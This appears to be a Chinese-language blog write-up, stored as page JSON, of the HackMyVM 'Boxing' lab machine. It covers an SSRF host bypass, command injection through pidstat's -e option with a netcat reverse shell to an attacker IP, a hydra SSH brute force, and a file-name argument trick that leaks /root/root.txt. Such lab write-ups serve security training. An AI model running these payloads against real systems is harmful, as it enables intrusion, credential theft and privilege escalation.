{"pageProps":{"postData":{"id":"HackMyVMBoxing","contentHtml":"<h1>Boxing.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Boxing\">https://hackmyvm.eu/machines/machine.php?vm=Boxing</a></p>\n</blockquote>\n<p>Notes：<strong>Enjoy it.</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  boxing nmap -sP 192.168.56.0/24                 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-16 03:11 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00028s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00029s latency).\nMAC Address: 08:00:27:05:4E:40 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.62\nHost is up (0.00044s latency).\nMAC Address: 08:00:27:82:38:A1 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 1.99 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  boxing nmap -sT -min-rate 10000 -p- 192.168.56.62\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-16 03:13 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.62\nHost is up (0.00024s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:82:38:A1 (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 5.31 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  boxing nmap -sT -A -T4 -O -p 22,80 192.168.56.62 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-16 03:14 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.62\nHost is up (0.00065s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n| ssh-hostkey: \n|   256 <span class=\"hljs-built_in\">dd</span>:74:2f:1c:d1:23:f6:1f:<span class=\"hljs-built_in\">dd</span>:3a:52:94:5d:8b:7c:d9 (ECDSA)\n|_  256 96:fb:74:b2:7d:ac:66:40:e9:94:<span class=\"hljs-built_in\">df</span>:83:9a:a6:07:64 (ED25519)\n80/tcp open  http    Apache httpd 2.4.57 ((Debian))\n|_http-title: Oxer\n|_http-server-header: Apache/2.4.57 (Debian)\nMAC Address: 08:00:27:82:38:A1 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.65 ms 192.168.56.62\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 8.62 seconds\n</code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集 &#x26; 漏洞检测</h3>\n<p>访问主页，将 <code>boxing.hmv</code> 写入 <code>hosts</code></p>\n<p><img src=\"/post-images/HackMyVMBoxing/image.png\" alt=\"image.png\"></p>\n<p>有个 <code>feedback</code> 功能点</p>\n<p><img src=\"/post-images/HackMyVMBoxing/image1.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackMyVMBoxing/image2.png\" alt=\"image.png\"></p>\n<p>对其 <code>fuzz</code> 了参数测试命令注入和使用 <code>Sqlmap</code> 测试注入，无果</p>\n<pre><code class=\"hljs language-bash\">➜  boxing wfuzz -c -w ../../Dict/SecLists-2024.3/Passwords/xato-net-10-million-passwords-100000.txt -u http://192.168.56.62/feedback.php -X POST -d <span class=\"hljs-string\">'FUZZ=whoami'</span> --hh=154\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.56.62/feedback.php\nTotal requests: 100000\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload\n=====================================================================\n\nTotal <span class=\"hljs-keyword\">time</span>: 124.8046\nProcessed Requests: 100000\nFiltered Requests: 100000\nRequests/sec.: 801.2518\n</code></pre>\n<p><img src=\"/post-images/HackMyVMBoxing/image3.png\" alt=\"image.png\"></p>\n<p>扫描一下子域名</p>\n<pre><code class=\"hljs language-bash\">➜  boxing wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-110000.txt  -u http://boxing.hmv -H <span class=\"hljs-string\">'host:FUZZ.boxing.hmv'</span> --hh=23854\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://boxing.hmv/\nTotal requests: 114441\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload\n=====================================================================\n\n000009532:   400        10 L     35 W       302 Ch      <span class=\"hljs-string\">\"#www - #www\"</span>\n000010581:   400        10 L     35 W       302 Ch      <span class=\"hljs-string\">\"#mail - #mail\"</span>\n000047706:   400        10 L     35 W       302 Ch      <span class=\"hljs-string\">\"#smtp - #smtp\"</span>\n000103135:   400        10 L     35 W       302 Ch      <span class=\"hljs-string\">\"#pop3 - #pop3\"</span>\n\nTotal <span class=\"hljs-keyword\">time</span>: 0\nProcessed Requests: 114441\nFiltered Requests: 114437\nRequests/sec.: 0\n</code></pre>\n<p>也没扫出来，但是在 <code>feedback</code> 的返回包中能看到有一个新域名 <code>staging-env.boxing.hmv</code></p>\n<p><img src=\"/post-images/HackMyVMBoxing/image4.png\" alt=\"image.png\"></p>\n<p>添加到 <code>hosts</code> ，访问</p>\n<p><img src=\"/post-images/HackMyVMBoxing/image5.png\" alt=\"image.png\"></p>\n<p>看着像是文件包含或者 <code>SSRF</code></p>\n<p><img src=\"/post-images/HackMyVMBoxing/image6.png\" alt=\"image.png\"></p>\n<h3>SSRF</h3>\n<p>尝试利用伪协议，但是没法使用，应该是被禁用了</p>\n<p>使用 <code>SSRF</code> 来枚举一下端口，但是默认的方法无法枚举，连<code>80</code>端口也没枚举出来</p>\n<pre><code class=\"hljs language-bash\">➜  boxing wfuzz -c -w ports.txt -u http://staging-env.boxing.hmv/index.php\\?url\\=127.0.0.1:FUZZ --hh=1184 \n</code></pre>\n<p>但是 <code>http://boxing.hmv</code> 可以进行包含，貌似限制了域名，加上 <code>@</code> 尝试绕过</p>\n<pre><code class=\"hljs language-bash\">➜  boxing wfuzz -c -w ports.txt -u http://staging-env.boxing.hmv/index.php\\?url\\=http://boxing.hmv@127.0.0.1:FUZZ --hh=1167\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://staging-env.boxing.hmv/index.php?url=http://boxing.hmv@127.0.0.1:FUZZ\nTotal requests: 10000\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload\n=====================================================================\n\n000000080:   200        701 L    1723 W     25021 Ch    <span class=\"hljs-string\">\"80\"</span>\n000005000:   200        95 L     182 W      2367 Ch     <span class=\"hljs-string\">\"5000\"</span>\n\nTotal <span class=\"hljs-keyword\">time</span>: 12.75934\nProcessed Requests: 10000\nFiltered Requests: 9998\nRequests/sec.: 783.7390\n</code></pre>\n<p>枚举出来 <code>5000</code> 端口，包含 <code>127.0.0.1:5000</code></p>\n<p><img src=\"/post-images/HackMyVMBoxing/image7.png\" alt=\"image.png\"></p>\n<p>像是搜索进程的，但是没有参数，先枚举一下参数</p>\n<p>尝试了好一会没有枚举出来，参考其他页面的参数，生成以<code>process</code>为前缀的字典</p>\n<pre><code class=\"hljs language-bash\">➜  boxing <span class=\"hljs-built_in\">cat</span> ../../Dict/fuzz/paramDict/AllParam.txt | awk <span class=\"hljs-string\">'{print \"process\" $1}'</span> > process_dict.txt\n</code></pre>\n<p>再次进行枚举，这里使用 <code>ffuf</code> ，<code>wfuzz</code> 一直报 <code>404</code></p>\n<pre><code class=\"hljs language-bash\">➜  boxing ffuf -w process_dict.txt -u  http://staging-env.boxing.hmv/index.php\\?url\\=http://boxing.hmv@127.0.0.1:5000\\?FUZZ\\=<span class=\"hljs-built_in\">id</span> -fl=96 \n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://staging-env.boxing.hmv/index.php?url=http://boxing.hmv@127.0.0.1:5000?FUZZ=id\n :: Wordlist         : FUZZ: /root/Desktop/test/boxing/process_dict.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response lines: 96\n________________________________________________\n\nprocessName             [Status: 200, Size: 2631, Words: 906, Lines: 100, Duration: 31ms]\n</span></code></pre>\n<p>枚举出参数<code>processName</code> ，尝试一下</p>\n<p><img src=\"/post-images/HackMyVMBoxing/image8.png\" alt=\"image.png\"></p>\n<p>确实可以看进程，但是也仅此而已，我们要关注该输出文本的指令是什么</p>\n<h3>命令拼接</h3>\n<p><img src=\"/post-images/HackMyVMBoxing/image9.png\" alt=\"image.png\"></p>\n<p><code>pidstat</code> 本身有执行命令的参数</p>\n<pre><code class=\"hljs language-bash\">➜  boxing pidstat -e <span class=\"hljs-built_in\">id</span>\nLinux 6.11.2-amd64 (kali)       2025年05月16日  _x86_64_        (16 CPU)\nuid=0(root) gid=0(root) 组=0(root)\n\n05时40分15秒   UID       PID    %usr %system  %guest   %<span class=\"hljs-built_in\">wait</span>    %CPU   CPU  Command\n</code></pre>\n<p>尝试进行拼接</p>\n<pre><code class=\"hljs language-bash\">http://boxing.hmv@127.0.0.1:5000?processName=<span class=\"hljs-string\">'apache'</span>+-e+<span class=\"hljs-built_in\">id</span>\n// 再对后面在进行一次 URL 编码\nhttp://boxing.hmv@127.0.0.1:5000?%70%72%6f%63%65%73%73%4e%61%6d%65%3d%27%61%70%61%63%68%65%27%2b%2d%65%2b%69%64\n</code></pre>\n<p><img src=\"/post-images/HackMyVMBoxing/image10.png\" alt=\"image.png\"></p>\n<p>成功输出，反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">processName=<span class=\"hljs-string\">'apache'</span>+-e+nc+-e+%2Fbin%2Fbash+192.168.56.4+1234\n/index.php?url=http://boxing.hmv@127.0.0.1:5000?%70%72%6f%63%65%73%73%4e%61%6d%65%3d%27%61%70%61%63%68%65%27%2b%2d%65%2b%6e%63%2b%2d%65%2b%25%32%46%62%69%6e%25%32%46%62%61%73%68%2b%31%39%32%2e%31%36%38%2e%35%36%2e%34%2b%31%32%33%34\n</code></pre>\n<p><img src=\"/post-images/HackMyVMBoxing/image11.png\" alt=\"image.png\"></p>\n<h2>提权 - To Cassius</h2>\n<p>有数据库文件</p>\n<pre><code class=\"hljs language-bash\">www-data@boxing:~/dev$ <span class=\"hljs-built_in\">ls</span>\nboxing_database.db  cache  index.php\n\nwww-data@boxing:~/dev$ file boxing_database.db \nboxing_database.db: SQLite 3.x database, last written using SQLite version 3040001, file counter 5, database pages 6, cookie 0x4, schema 4, UTF-8, version-valid-for 5\n</code></pre>\n<p><code>SQLite</code> 文件</p>\n<pre><code class=\"hljs language-bash\">sqlite> .tables\nfighters  matches   news      <span class=\"hljs-built_in\">users</span> \nsqlite> <span class=\"hljs-keyword\">select</span> * from <span class=\"hljs-built_in\">users</span>;\n1|cassius|$2b$05<span class=\"hljs-variable\">$gPKe1EUBPZidX</span>/j3qTDapeznU4CMfkpMd0sQhgehhhoG/pwc4OnVu\n</code></pre>\n<p>得到用户 <code>cassius</code> 何其加密后的密码</p>\n<p>继续在当前文件夹寻找信息，在 <code>cache/client_requests.har.swp</code> 能找到：</p>\n<pre><code class=\"hljs language-bash\">Hello! You don<span class=\"hljs-string\">'t have a link to reset the password, and I'</span>ve forgotten it! I tried Cassius! but it doesn<span class=\"hljs-string\">'t work; Contact me asap pease!\n\nCassius\n</span></code></pre>\n<p>说是尝试使用<code>Cassius</code>用户的密码<code>Cassius!</code>但是失败了</p>\n<p>通过<code>Cassius!</code> 来生成密码本，尝试了以<code>Cassius!</code> 前缀但是失败了，这里看了下<code>wp</code>，使用在线工具：<a href=\"https://www.ddosi.org/pass8/\">https://www.ddosi.org/pass8/</a></p>\n<pre><code class=\"hljs language-bash\">➜  boxing hydra -l cassius -P pass.txt -t 12 192.168.56.62 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC &#x26; David Maciejak - Please <span class=\"hljs-keyword\">do</span> not use <span class=\"hljs-keyword\">in</span> military or secret service organizations, or <span class=\"hljs-keyword\">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-16 07:10:57\n[WARNING] Many SSH configurations <span class=\"hljs-built_in\">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 12 tasks per 1 server, overall 12 tasks, 7370 login tries (l:1/p:7370), ~615 tries per task\n[DATA] attacking ssh://192.168.56.62:22/\n[22][ssh] host: 192.168.56.62   login: cassius   password: Cassius!123\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-16 07:11:34\n</code></pre>\n<p>得到密码 <code>Cassius!123</code></p>\n<p><code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">cassius@boxing:~$ <span class=\"hljs-built_in\">cat</span> user.txt \na2b3946358a96bb7a92f61a759a1d972\n</code></pre>\n<h2>提权 - To Root</h2>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">cassius@boxing:~$ <span class=\"hljs-built_in\">sudo</span> -l\n-bash: <span class=\"hljs-built_in\">sudo</span> : commande introuvable\n</code></pre>\n<p>在 <code>/opt/sos</code> 中有脚本（没找到其他可以利用的点了）</p>\n<pre><code class=\"hljs language-bash\">cassius@boxing:/opt/sos$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 20\ndrwxr-xr-x 3 root root 4096  4 févr.  2024 .\ndrwxr-xr-x 4 root root 4096  4 févr.  2024 ..\n-rwxr-xr-x 1 root root  298  4 févr.  2024 incrontab.sh\ndrwxr-xr-x 2 root root 4096  4 févr.  2024 logs\n-rwxr-xr-x 1 root root  323  4 févr.  2024 sos.sh\n</code></pre>\n<pre><code class=\"hljs language-bash\">cassius@boxing:/opt/sos$ <span class=\"hljs-built_in\">cat</span> incrontab.sh \n<span class=\"hljs-comment\">#!/bin/bash</span>\n\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'/etc/apache2/sites-available/000-default.conf IN_MODIFY systemctl restart apache2'</span> | incrontab -\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'/etc IN_DELETE,IN_MODIFY,IN_MOVED_FROM /bin/echo \"File: $@/$# => $%\" > /root/user_flag.log'</span> | incrontab -\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'/home/cassius/user.txt IN_ATTRIB /opt/sos/sos.sh'</span> | incrontab -\n</code></pre>\n<p>当 <code>/home/cassius/user.txt</code> 文件的属性（如权限、时间戳等）发生变化时，执行 <code>/opt/sos/sos.sh</code> 脚本。</p>\n<pre><code class=\"hljs language-bash\">cassius@boxing:/opt/sos$ <span class=\"hljs-built_in\">cat</span> sos.sh \n<span class=\"hljs-comment\">#!/bin/bash</span>\n\nlogs=<span class=\"hljs-string\">\"/opt/sos/logs/output-logs.txt\"</span>\n<span class=\"hljs-built_in\">rm</span> <span class=\"hljs-variable\">$logs</span>\n<span class=\"hljs-built_in\">exec</span> &#x26;><span class=\"hljs-variable\">$logs</span>\n\n<span class=\"hljs-built_in\">cd</span> /home/cassius\nfile *\nss -altupn\nlast -a\nw\nps aux\ntop -n 1\nlsof\n\n<span class=\"hljs-keyword\">for</span> user <span class=\"hljs-keyword\">in</span> $(<span class=\"hljs-built_in\">cut</span> -f1 -d: /etc/passwd); <span class=\"hljs-keyword\">do</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Cron jobs for <span class=\"hljs-variable\">$user</span>:\"</span>\ncrontab -u <span class=\"hljs-variable\">$user</span> -l\n<span class=\"hljs-keyword\">done</span>\n\n<span class=\"hljs-built_in\">tail</span> /var/log/syslog\n<span class=\"hljs-built_in\">sha256sum</span> /bin/* /sbin/* /usr/bin/* /usr/sbin/*\n\n<span class=\"hljs-built_in\">chmod</span> 700 <span class=\"hljs-variable\">$logs</span>\n</code></pre>\n<p>其中最有问题的就是 <code>file *</code></p>\n<ul>\n<li>\n<p>是 Shell 的通配符，表示“匹配当前目录下所有非隐藏文件”。</p>\n</li>\n<li>\n<p>当输入 <code>file *</code> 时，Shell 会先将  扩展为当前目录下的所有非隐藏文件名（例如 <code>file1.txt file2.jpg dir1</code>），然后将这些文件名作为参数传递给 <code>file</code> 命令。</p>\n</li>\n<li>\n<p>例如，如果当前目录有 <code>a.txt</code>、<code>b.jpg</code>、<code>c.sh</code>，则 <code>file *</code> 实际会变成：</p>\n<pre><code class=\"hljs language-bash\">file a.txt b.jpg c.sh\n</code></pre>\n</li>\n</ul>\n<p>那么如果里面有一个名为 <code>-f</code> 的文件，这会：</p>\n<p><img src=\"/post-images/HackMyVMBoxing/image12.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">cassius@boxing:~$ <span class=\"hljs-built_in\">touch</span> ./-f\ncassius@boxing:~$ <span class=\"hljs-built_in\">ln</span> -sv /root/root.txt root.txt\ncassius@boxing:~$ <span class=\"hljs-keyword\">while</span> :; <span class=\"hljs-keyword\">do</span> <span class=\"hljs-built_in\">cp</span> /opt/sos/logs/output-logs.txt /tmp/output-logs.txt 2>/dev/null;<span class=\"hljs-keyword\">done</span> &#x26;\n[1] 1716\n<span class=\"hljs-string\">'root.txt'</span> -> <span class=\"hljs-string\">'/root/root.txt'</span>   \ncassius@boxing:~$ <span class=\"hljs-built_in\">chmod</span> 600 user.txt \n</code></pre>\n<p>最后读取<code>/tmp/output-logs.txt</code></p>\n<pre><code class=\"hljs language-bash\">cassius@boxing:~$ <span class=\"hljs-built_in\">head</span> /tmp/output-logs.txt \n19ed17ba1da85521ce659aeeb5ecd751: cannot open `19ed17ba1da85521ce659aeeb5ecd751<span class=\"hljs-string\">' (No such file or directory)\ntouch:    empty\nuser.txt: ASCII text\nNetid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                           \nudp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*    users:((\"dhclient\",pid=392,fd=7))\ntcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:((\"sshd\",pid=538,fd=3))    \ntcp   LISTEN 0      4096       127.0.0.1:5000      0.0.0.0:*    users:((\"php\",pid=516,fd=4))     \ntcp   LISTEN 0      128             [::]:22           [::]:*    users:((\"sshd\",pid=538,fd=4))    \ntcp   LISTEN 0      511                *:80              *:*    users:((\"apache2\",pid=551,fd=4),(\"apache2\",pid=544,fd=4),(\"apache2\",pid=543,fd=4),(\"apache2\",pid=542,fd=4),(\"apache2\",pid=541,fd=4),(\"apache2\",pid=540,fd=4),(\"apache2\",pid=539,fd=4))\ncassius  pts/0        Fri May 16 13:12   still logged in    192.168.56.4\n</span></code></pre>\n<p><code>root.txt</code> ，想要获取<code>root shell</code> 可以读取 <code>root</code>的私钥</p>\n<pre><code class=\"hljs language-bash\">19ed17ba1da85521ce659aeeb5ecd751\n</code></pre>\n<h2>总结</h2>\n<p>细心细心细心，耐心耐心耐心</p>","title":"HackMyVM - Boxing","date":"2025-05-16","updated":"2025-05-17","tags":["HackMyVM","Linux靶机","SSRF","文件包含","file","命令注入"],"categories":"靶机","comments":true,"description":"Boxing.\n\n https://hackmyvm.eu/machines/machine.php?vm=Boxing\n \n\nNotes：Enjoy it.\n\n前期踩点\n\n\n\n\n\n\n\nWeb 渗透\n\n信息收集 & 漏洞检测\n\n访问主页，将 `boxing.hmv` 写入 `hosts`\n\n\n\n有个 `feedback` 功能点\n\n\n\n\n\n对其 `fuzz` 了参数测试命令注入和使用 `Sqlma..."},"recentPosts":[{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"},{"id":"群U靶机Tools","title":"群U靶机 - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"},{"id":"HackTheBoxMachine - Ellingson","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","isEncrypted":false,"year":"2025","month":"06","day":"15"}]},"__N_SSG":true}